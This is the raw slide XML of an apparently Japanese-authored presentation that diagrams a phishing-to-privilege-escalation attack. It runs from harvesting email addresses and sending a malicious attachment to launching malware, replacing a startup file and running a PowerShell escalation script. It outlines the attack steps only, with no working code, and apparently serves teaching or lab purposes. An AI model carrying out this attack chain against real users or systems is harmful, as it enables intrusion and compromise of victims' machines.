            <a:chExt cx="7885266" cy="646332"/>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4771937" y="3319285"/>
              <a:ext cx="5585394" cy="401271"/>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login to </a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>victimPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRP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097311" y="3432064"/>
            <a:ext cx="4680929" cy="3212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93988" y="3570257"/>
            <a:ext cx="4387181" cy="338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>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805560" y="5341174"/>
            <a:ext cx="4387181" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" dirty="0"/>
              <a:t>use PowerShell-Privilege-Escalation(ps1)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1645427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グループ化 49">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DC423257-0E8A-FC45-C6F4-130634B38521}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="217088" y="1049318"/>
            <a:ext cx="1611398" cy="675074"/>
            <a:chOff x="639989" y="987878"/>
            <a:chExt cx="2039710" cy="1045028"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="51" name="グループ化 50">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2F78C895-2012-121A-9F80-BF812D0FF7DE}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="639989" y="987878"/>
              <a:ext cx="1126670" cy="1045028"/>
              <a:chOff x="639989" y="987878"/>
              <a:chExt cx="1126670" cy="1045028"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="53" name="四角形: 角を丸くする 52">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5B083F79-73CA-9D02-55B2-60336B7DC304}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="639989" y="987878"/>
                <a:ext cx="1126670"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二等辺三角形 53">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C16182D7-6694-DDA4-7868-D0694041E29C}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="871309" y="1747157"/>
                <a:ext cx="664027" cy="285749"/>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C21BBE27-1855-4257-E899-6DB36663ACB5}"/>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ボックス 51">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F050492E-9DB6-4D59-42A0-45BF0BC8E9D3}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="712107" y="1236712"/>
              <a:ext cx="1967592" cy="357333"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="900" dirty="0"/>
                <a:t>Mail </a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="900" dirty="0"/>
                <a:t>＆</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="900" dirty="0"/>
                <a:t>DNS</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="900" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="67" name="四角形: 角を丸くする 66">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{985FF41F-BE90-4796-8264-5F7ED2D9B075}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6526037" y="622657"/>
            <a:ext cx="4878244" cy="160681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59980" y="1213750"/>
            <a:ext cx="4387181" cy="1077218"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Victim opens an email with malware attached.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>   (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> command)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    Establishing a connection </a:t>
            </a:r>
          </a:p>
          <a:p>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2341345"/>
            <a:ext cx="4878244" cy="153444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324547" y="404946"/>
            <a:ext cx="8065979" cy="1200329"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>Approach3:Privilege escalation</a:t>
            </a:r>
            <a:br>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="2400" dirty="0"/>
              <a:t>				 from an Mail  Attack</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51210" y="3945481"/>
            <a:ext cx="4878244" cy="165259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0" name="グループ化 19">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7A0F568C-FD3E-4960-9019-26D33DA84078}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="11012897" y="6105845"/>
            <a:ext cx="1677885" cy="717945"/>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335995"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="900" dirty="0" err="1"/>
                <a:t>VictimPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="90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540580"/>
            <a:chOff x="2491468" y="1520261"/>
            <a:chExt cx="7780899" cy="726609"/>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4"/>
              <a:ext cx="5412921" cy="703276"/>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Find </a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>MailAddress</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>(</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>web,SNS</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t> </a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>etc</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP"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 and malware</a:t>
                </a:r>
                <a:br>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                </a:br>
                <a:r>
                  <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>・</a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>prepare Mail </a:t>
                </a:r>
                <a:r>
                  <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                    <a:solidFill>
                      <a:schemeClr val="bg1"/>
                    </a:solidFill>
                  </a:rPr>
                  <a:t>templete</a:t>
                </a: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579061" y="2434302"/>
            <a:ext cx="4749018" cy="554528"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="7885266" cy="717368"/>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676866"/>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set </a:t>
              </a:r>
              <a:br>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
              </a:br>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:gr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338554"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>MailAddress</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>website,SNS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>etc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>)</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290" y="4081361"/>
            <a:ext cx="5026053" cy="6387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1077218"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Create Mail </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0" err="1"/>
              <a:t>Templete</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t> and Malicious code</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>    </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>　</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r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>Send to mail</a:t>
            </a:r>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39432" y="701492"/>
            <a:ext cx="5807361" cy="528411"/>
            <a:chOff x="2472065" y="3278783"/>
            <a:chExt cx="9642538" cy="688928"/>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6529209" y="3285551"/>
              <a:ext cx="5585394" cy="6821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login to </a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0" err="1">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>victimPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
              </a:endParaRPr>
            </a:p>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>・</a:t>
              </a:r>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1400" dirty="0">
                  <a:solidFill>
                    <a:schemeClr val="bg1"/>
                  </a:solidFill>
                </a:rPr>
                <a:t>launch malware</a:t>
              </a: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097311" y="3432064"/>
            <a:ext cx="4680929" cy="3212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32535" y="2948916"/>
            <a:ext cx="4387181" cy="584775"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t>→</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>malicious ware replace the startup file</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="1600" dirty="0"/>
              <a:t>     </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="1600" dirty="0"/>
              <a:t> </a:t>
            </a:r>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690103" y="4690836"/>
            <a:ext cx="4387181" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="ja-JP" altLang="en-US" dirty="0"/>
              <a:t>→</a:t>
            </a:r>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217836" y="1808501"/>
            <a:ext cx="1611398" cy="675074"/>
            <a:chOff x="639989" y="987878"/>
            <a:chExt cx="2039710" cy="1045028"/>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9" y="987878"/>
              <a:ext cx="1126670" cy="1045028"/>
              <a:chOff x="639989" y="987878"/>
              <a:chExt cx="1126670" cy="1045028"/>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9" y="987878"/>
                <a:ext cx="1126670"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09" y="1747157"/>
                <a:ext cx="664027" cy="285749"/>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357333"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
                <a:rPr kumimoji="1" lang="en-US" altLang="ja-JP" sz="900" dirty="0" err="1"/>
                <a:t>AdversaryPC</a:t>
              </a:r>
              <a:endParaRPr kumimoji="1" lang="ja-JP" altLang="en-US" sz="900" dirty="0"/>
            </a:p>
          </p:txBody>
        </p:sp>
      </p:grpSp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="37" name="グループ化 36">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{92320816-E74E-2847-9886-3D18FDED45A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="145715" y="2367938"/>
            <a:ext cx="666307" cy="444520"/>
            <a:chOff x="-1337707" y="3496256"/>
            <a:chExt cx="1047782" cy="640593"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="33" name="グループ化 32">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E3471B53-211C-81FE-69B6-04B58B5C70B9}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="-1337707" y="3496256"/>
              <a:ext cx="1047782" cy="640593"/>
              <a:chOff x="-1712067" y="1840219"/>
              <a:chExt cx="1047782" cy="640593"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="7" name="正方形/長方形 6">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CC0B55F7-8402-D2CD-61DC-86928406FD86}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="-1712067" y="1840219"/>
                <a:ext cx="1047782" cy="6405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二等辺三角形 7">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{A5F0A62C-6103-6E8D-05C8-EC0036488DC3}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="10800000">
                <a:off x="-1703947" y="1840219"/>
                <a:ext cx="1027971" cy="392090"/>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スマイル 35">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D5CF984D-F77D-8CA1-A5DF-8D01C5E3ADDF}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-735751" y="3759444"/>
              <a:ext cx="390839" cy="357733"/>
            </a:xfrm>
            <a:prstGeom prst="smileyFac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5" name="グループ化 44">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6E110349-1A2A-6527-0E0C-BE6D3A39306D}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="10436764" y="6275786"/>
            <a:ext cx="803759" cy="534993"/>
            <a:chOff x="-1337707" y="3496256"/>
            <a:chExt cx="1047782" cy="640593"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="46" name="グループ化 45">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96E7B027-B124-DC00-25C6-DF8031959D43}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="-1337707" y="3496256"/>
              <a:ext cx="1047782" cy="640593"/>
              <a:chOff x="-1712067" y="1840219"/>
              <a:chExt cx="1047782" cy="640593"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="48" name="正方形/長方形 47">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{375D505C-C102-BE5D-5F28-C1853924FCD2}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm>
                <a:off x="-1712067" y="1840219"/>
                <a:ext cx="1047782" cy="6405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二等辺三角形 48">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DE0B3F3C-F758-CFD6-7A36-8B00B08A9CF8}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr/>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr>
              <a:xfrm rot="10800000">
                <a:off x="-1703947" y="1840219"/>
                <a:ext cx="1027971" cy="392090"/>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7" name="スマイル 46">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{EC3E065A-97D2-FBBF-D221-14334AFADA2F}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="-735751" y="3759444"/>
              <a:ext cx="390839" cy="357733"/>
            </a:xfrm>
            <a:prstGeom prst="smileyFac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4" name="グループ化 83">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9339A545-B93E-EE83-5FE4-6EE3A2411103}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="11115351" y="5302929"/>
            <a:ext cx="1629244" cy="717945"/>
            <a:chOff x="8990237" y="5765648"/>
            <a:chExt cx="2106765" cy="1045029"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="85" name="グループ化 84">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E748F513-FE49-CC10-2E53-40173EECCF77}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvGrpSpPr/>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr>
            <a:xfrm>
              <a:off x="8990237" y="5765648"/>
              <a:ext cx="1126671" cy="1045029"/>
              <a:chOff x="8990237" y="5765648"/>
              <a:chExt cx="1126671" cy="1045029"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="87" name="四角形: 角を丸くする 86">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{7639AFB4-4164-9C9D-FF8F-FB9BD57775D6}"/>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88" name="二等辺三角形 87">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{96996518-4DB5-BE19-DC24-FB5CC446738B}"/>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89" name="正方形/長方形 88">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{60F9804E-6FBD-0EB7-2179-36A3210DA117}"/>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grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="86" name="テキスト ボックス 85">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{DF118D26-0CF8-5920-A6B8-5715ECA0592B}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr txBox="1"/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="9129410" y="5976862"/>
              <a:ext cx="1967592" cy="335995"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
          </p:spPr>
          <p:txBody>
            <a:bodyPr wrap="square" rtlCol="0">
              <a:spAutoFit/>
            </a:bodyPr>
            <a:lstStyle/>
            <a:p>
              <a:r>
